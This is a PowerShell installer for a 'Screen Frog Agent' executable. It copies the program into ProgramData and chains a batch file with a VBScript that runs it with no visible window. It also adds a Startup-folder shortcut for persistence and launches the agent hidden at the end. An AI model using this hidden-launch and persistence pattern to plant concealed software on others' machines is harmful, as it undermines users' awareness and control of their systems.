# Screen Frog Agent - One-Click Installer
# This script sets up the agent, background launcher, and startup persistence.

$InstallDir = "C:\ProgramData\ScreenFrog"
$AgentExe = "seb_agent_v3.exe"
$SourcePath = Get-Location

Write-Host "[*] Starting Screen Frog Agent Installation..." -ForegroundColor Cyan

# 1. Create Installation Directory
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    Write-Host "[+] Created directory: $InstallDir"
}

# 2. Copy Agent Files (Assuming installer is run from the folder containing the exe)
if (Test-Path "$SourcePath\$AgentExe") {
    Copy-Item "$SourcePath\$AgentExe" "$InstallDir\" -Force
    Write-Host "[+] Agent executable copied."
} else {
    Write-Host "[!] Error: $AgentExe not found in current directory!" -ForegroundColor Red
    exit
}

# 3. Create run_hidden.bat
$BatContent = @"
@echo off
start /b "" "$InstallDir\$AgentExe"
exit
"@
$BatContent | Out-File -FilePath "$InstallDir\run_hidden.bat" -Encoding ascii
Write-Host "[+] Background launcher (BAT) created."

# 4. Create run_silent.vbs
$VbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & "$InstallDir\run_hidden.bat" & Chr(34), 0
Set WshShell = Nothing
"@
$VbsContent | Out-File -FilePath "$InstallDir\run_silent.vbs" -Encoding ascii
Write-Host "[+] Silent runner (VBS) created."

# 5. Add to Startup
$WshShell = New-Object -ComObject WScript.Shell
$StartupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$Shortcut = $WshShell.CreateShortcut([System.IO.Path]::Combine($StartupPath, 'ScreenFrogAgent.lnk'))
$Shortcut.TargetPath = "$InstallDir\run_silent.vbs"
$Shortcut.WorkingDirectory = "$InstallDir"
$Shortcut.Save()
Write-Host "[+] Added to Windows Startup."

# 6. Initial Launch
Write-Host "[*] Launching Agent in background..." -ForegroundColor Green
Start-Process "wscript.exe" -ArgumentList "`"$InstallDir\run_silent.vbs`""

Write-Host "`n[SUCCESS] Screen Frog Agent installed and running hidden." -ForegroundColor Green
Write-Host "Installation path: $InstallDir"
pause
